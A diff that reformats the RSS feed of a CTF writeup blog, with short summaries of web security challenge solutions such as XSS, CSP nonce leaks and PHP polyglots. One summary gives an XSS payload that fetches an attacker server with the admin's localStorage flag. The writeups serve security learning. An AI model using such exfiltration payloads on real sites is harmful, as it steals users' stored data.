@@ -1,116 +1,83 @@
 <?xml version="1.0" encoding="utf-8" standalone="yes"?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
-    <title>writeups on VIE</title>
+    <title>Writeups on VIE</title>
     <link>https://jamvie.net/categories/writeups/</link>
-    <description>Recent content in writeups on VIE</description>
-    <generator>Hugo -- gohugo.io</generator>
+    <description>Recent content in Writeups on VIE</description>
+    <generator>Hugo</generator>
     <language>en-us</language>
     <copyright>CC Attribution-NonCommercial 4.0 International License</copyright>
-    <lastBuildDate>Sun, 07 Jul 2024 10:29:46 -0400</lastBuildDate><atom:link href="https://jamvie.net/categories/writeups/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Sun, 07 Jul 2024 10:29:46 -0400</lastBuildDate>
+    <atom:link href="https://jamvie.net/categories/writeups/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>DUCTF 2024: Prisoner Processor</title>
       <link>https://jamvie.net/posts/2024/07/ductf-2024-prisoner-processor/</link>
       <pubDate>Sun, 07 Jul 2024 10:29:46 -0400</pubDate>
-      
       <guid>https://jamvie.net/posts/2024/07/ductf-2024-prisoner-processor/</guid>
       <description>DUCTF 2024 has concluded this summer, and I decided to take a look at it with Maple Bacon and solve a few challenges. This is specifically a writeup for &amp;ldquo;Prisoner-Processor&amp;rdquo;, the hardest web challenge available. My teammate Angus and I solved this together. It was a great challenge and ventured into alot of interesting things about Bun and TypeScript, so kudos to the authors for making such an interesting challenge!</description>
     </item>
-    
     <item>
       <title>MAPLECTF 2023: JUJUTSU KAISEN</title>
       <link>https://jamvie.net/posts/2023/10/maplectf-2023-jujutsu-kaisen/</link>
       <pubDate>Tue, 10 Oct 2023 19:53:16 +0800</pubDate>
-      
       <guid>https://jamvie.net/posts/2023/10/maplectf-2023-jujutsu-kaisen/</guid>
-      <description>MapleCTF&amp;rsquo;s 2nd annual CTF was held at the same time as Hackceler8 preparation week, so for a brief couple of days in Japan I was busy helping organize 2 ctfs at once, which I don&amp;rsquo;t recommend.
-This year, I decided to spice things up with my chals, my vie chals, by incorporating a fun prize for whichever team manages to solve all of my challenges.I had 3 challenges: JaVieScript, Blade Runner, and Jujutsu Kaisen.</description>
+      <description>MapleCTF&amp;rsquo;s 2nd annual CTF was held at the same time as Hackceler8 preparation week, so for a brief couple of days in Japan I was busy helping organize 2 ctfs at once, which I don&amp;rsquo;t recommend.&#xA;This year, I decided to spice things up with my chals, my vie chals, by incorporating a fun prize for whichever team manages to solve all of my challenges.I had 3 challenges: JaVieScript, Blade Runner, and Jujutsu Kaisen.</description>
     </item>
-    
     <item>
       <title>PBCTF 2023 : JAZZY x VIE CHALS</title>
       <link>https://jamvie.net/posts/2023/02/pbctf-2023-jazzy-x-vie-chals/</link>
       <pubDate>Tue, 21 Feb 2023 15:25:54 -0700</pubDate>
-      
       <guid>https://jamvie.net/posts/2023/02/pbctf-2023-jazzy-x-vie-chals/</guid>
-      <description>I was a guest challenge writer for perfect blue&amp;rsquo;s CTF held mid February. We play-tested each others chals :P
-MAKIMA Challenge Description Makima simps check in here
-I&amp;rsquo;m actually a Power stan. I just needed an excuse for people to look at my Makima drawing.
-TL;DR Hide php in image, making a PHP/image polyglot X-Accel-Header redirection through CDN to reach internal .php files and access /uploads/your_img.png/lol.php to execute PHP The important parts The default.</description>
+      <description>I was a guest challenge writer for perfect blue&amp;rsquo;s CTF held mid February. We play-tested each others chals :P&#xA;MAKIMA Challenge Description Makima simps check in here&#xA;I&amp;rsquo;m actually a Power stan. I just needed an excuse for people to look at my Makima drawing.&#xA;TL;DR Hide php in image, making a PHP/image polyglot X-Accel-Header redirection through CDN to reach internal .php files and access /uploads/your_img.png/lol.php to execute PHP The important parts The default.</description>
     </item>
-    
     <item>
       <title>MapleCTF 2022    : Vie&#39;s challenges</title>
       <link>https://jamvie.net/posts/2022/09/maplectf-2022-vies-challenges/</link>
       <pubDate>Thu, 01 Sep 2022 14:50:08 -0600</pubDate>
-      
       <guid>https://jamvie.net/posts/2022/09/maplectf-2022-vies-challenges/</guid>
       <description>MapleCTF 2022 ran this year to great success, which is fantastic given the tight timeframe we were operating on shortly after coming back from DEFCON 30. We held a beginner-friendly, UBC-local version back in January, so our endgame for this version was to make more creative and harder challenges that people hopefully enjoyed. I wrote 3 web challenges for this CTF: honksay, Viene Library and Art Gallery, the latter 2 I will detail here.</description>
     </item>
-    
     <item>
       <title>NahamCon CTF 2022</title>
       <link>https://jamvie.net/posts/2022/05/nahamcon-ctf-2022/</link>
       <pubDate>Mon, 02 May 2022 12:40:52 -0700</pubDate>
-      
       <guid>https://jamvie.net/posts/2022/05/nahamcon-ctf-2022/</guid>
       <description>Just in Time Maple Bacon played in NahamCon CTF 2022 this past weekend, which came as a surprise - we were fully planning on focusing our efforts onto AngstromCTF which overlapped, however, NahamCon CTF proved to be interesting and good-quality so a last-minute decision was made to participate in both. AngstromCTF is still underway, but in the awkward passage of time between my last week and weekend, I played in NahamCon CTF for a little bit of practice.</description>
     </item>
-    
     <item>
       <title>B01lers CTF 2022: hacker/place</title>
       <link>https://jamvie.net/posts/2022/04/b01lers-ctf-2022-hacker/place/</link>
       <pubDate>Tue, 26 Apr 2022 19:59:24 -0700</pubDate>
-      
       <guid>https://jamvie.net/posts/2022/04/b01lers-ctf-2022-hacker/place/</guid>
-      <description>Thoughts This year&amp;rsquo;s b01lers CTF was a great one for Maple Bacon, given that we came in first. A fantastic development, especially since last year we landed in 7th, so we&amp;rsquo;ve certainly improved a great deal since then.
-While the balance of problems was skewed, the CTF was overall an enjoyable experience. It was nice to delve into the different problems outside of web (whilst waiting for the one (1) web challenge to release), which reminded me I really need to touch up on my reversing skills, a 2022 new year resolution that I wanted to get into.</description>
+      <description>Thoughts This year&amp;rsquo;s b01lers CTF was a great one for Maple Bacon, given that we came in first. A fantastic development, especially since last year we landed in 7th, so we&amp;rsquo;ve certainly improved a great deal since then.&#xA;While the balance of problems was skewed, the CTF was overall an enjoyable experience. It was nice to delve into the different problems outside of web (whilst waiting for the one (1) web challenge to release), which reminded me I really need to touch up on my reversing skills, a 2022 new year resolution that I wanted to get into.</description>
     </item>
-    
     <item>
       <title>ASIS Quals 2021: Lovely Nonce</title>
       <link>https://jamvie.net/posts/2021/10/asis-quals-2021-lovely-nonce/</link>
       <pubDate>Sun, 24 Oct 2021 13:49:21 -0700</pubDate>
-      
       <guid>https://jamvie.net/posts/2021/10/asis-quals-2021-lovely-nonce/</guid>
-      <description>Lovely Nonces is a challenge from ASIS Quals 2021, involving interesting CSP bypasses and stylesheet leaks. My teammate Ming and I solved this challenge together, and a copy of the writeup (with the index.html file used in the exploit) can be found in the UBC CTF blog.
-TL;DR CSS attribute selectors for a stylesheet leak of the CSP nonce combined with XSS.
-Recon The CSP is implemented via a meta-tag in the DOM, and not through response header as is usually the common practise.</description>
+      <description>Lovely Nonces is a challenge from ASIS Quals 2021, involving interesting CSP bypasses and stylesheet leaks. My teammate Ming and I solved this challenge together, and a copy of the writeup (with the index.html file used in the exploit) can be found in the UBC CTF blog.&#xA;TL;DR CSS attribute selectors for a stylesheet leak of the CSP nonce combined with XSS.&#xA;Recon The CSP is implemented via a meta-tag in the DOM, and not through response header as is usually the common practise.</description>
     </item>
-    
     <item>
       <title>RaRCTF 2021: MAAS 2 &#43; Unintended Solutions</title>
       <link>https://jamvie.net/posts/2021/08/rarctf-2021-maas-2--unintended-solutions/</link>
       <pubDate>Fri, 20 Aug 2021 13:49:21 -0700</pubDate>
-      
       <guid>https://jamvie.net/posts/2021/08/rarctf-2021-maas-2--unintended-solutions/</guid>
-      <description>MAAS 2 // Notes Source was the same from MAAS 1 (and will be the same for MAAS 3). MAAS 2 involved the &amp;rsquo;notes&amp;rsquo; part of MAAS, where you are prompted to register a user and afterwards add key:val attributes to yourself, give yourself a bio, or transfer key:value attributes to another user.
-The provided source has some interesting code:
-notes/app.py
-@app.route(&amp;#39;/useraction&amp;#39;, methods=[&amp;#34;POST&amp;#34;]) def useraction(): mode = request.form.get(&amp;#34;mode&amp;#34;) username = request.</description>
+      <description>MAAS 2 // Notes Source was the same from MAAS 1 (and will be the same for MAAS 3). MAAS 2 involved the &amp;rsquo;notes&amp;rsquo; part of MAAS, where you are prompted to register a user and afterwards add key:val attributes to yourself, give yourself a bio, or transfer key:value attributes to another user.&#xA;The provided source has some interesting code:&#xA;notes/app.py&#xA;@app.route(&amp;#39;/useraction&amp;#39;, methods=[&amp;#34;POST&amp;#34;]) def useraction(): mode = request.form.get(&amp;#34;mode&amp;#34;) username = request.</description>
     </item>
-    
     <item>
       <title>RaRCTF2021: Some simpler web probz</title>
       <link>https://jamvie.net/posts/2021/08/rarctf2021-some-simpler-web-probz/</link>
       <pubDate>Mon, 09 Aug 2021 13:49:21 -0700</pubDate>
-      
       <guid>https://jamvie.net/posts/2021/08/rarctf2021-some-simpler-web-probz/</guid>
-      <description>Fancy Button Generator // FBG A simple xss challenge with the slightest of twists: instead of stealing admin cookies, you&amp;rsquo;re stealing admin&amp;rsquo;s localstorage values. This was possible because the admin, which was a puppetteer chrome browser, was operating in no-sandbox mode.
-Insert as your payload:
-title: eh link: javascript:fetch(&amp;#39;your.server?fleg=&amp;#39;%2B(window.localStorage.getItem(&amp;#34;flag&amp;#34;))); And report to admin. Careful with the wait times&amp;hellip;
-NOTE: I first-blooded this challenge before certain measures were implemented. There were some issues with FBG throughout the competition that involved the organizers making amendments and introducing a pow to help with the stability of the infrastructure.</description>
+      <description>Fancy Button Generator // FBG A simple xss challenge with the slightest of twists: instead of stealing admin cookies, you&amp;rsquo;re stealing admin&amp;rsquo;s localstorage values. This was possible because the admin, which was a puppetteer chrome browser, was operating in no-sandbox mode.&#xA;Insert as your payload:&#xA;title: eh link: javascript:fetch(&amp;#39;your.server?fleg=&amp;#39;%2B(window.localStorage.getItem(&amp;#34;flag&amp;#34;))); And report to admin. Careful with the wait times&amp;hellip;&#xA;NOTE: I first-blooded this challenge before certain measures were implemented. There were some issues with FBG throughout the competition that involved the organizers making amendments and introducing a pow to help with the stability of the infrastructure.</description>
     </item>
-    
     <item>
       <title>DEF CON Quals 2021: Getting Gud &#43; threefactooorx</title>
       <link>https://jamvie.net/posts/2021/04/def-con-quals-2021-getting-gud--threefactooorx/</link>
       <pubDate>Sun, 11 Apr 2021 00:07:54 -0600</pubDate>
-      
       <guid>https://jamvie.net/posts/2021/04/def-con-quals-2021-getting-gud--threefactooorx/</guid>
-      <description>AKA - How I spent some time reading custom partially-deobfuscated javascript code and actually used the Chrome debugger for once
-DEF CON - undoubtedly the most notorious, famous and recgonized CTF out there. Even people who don&amp;rsquo;t do hacking know about DEF CON. The qualifiers, an event that took place this last weekend, ran for roughly 2 days and had 1 web challenge - which was more like reversing, but I&amp;rsquo;ll take what I can get.</description>
+      <description>AKA - How I spent some time reading custom partially-deobfuscated javascript code and actually used the Chrome debugger for once&#xA;DEF CON - undoubtedly the most notorious, famous and recgonized CTF out there. Even people who don&amp;rsquo;t do hacking know about DEF CON. The qualifiers, an event that took place this last weekend, ran for roughly 2 days and had 1 web challenge - which was more like reversing, but I&amp;rsquo;ll take what I can get.</description>
     </item>
-    
   </channel>
 </rss>
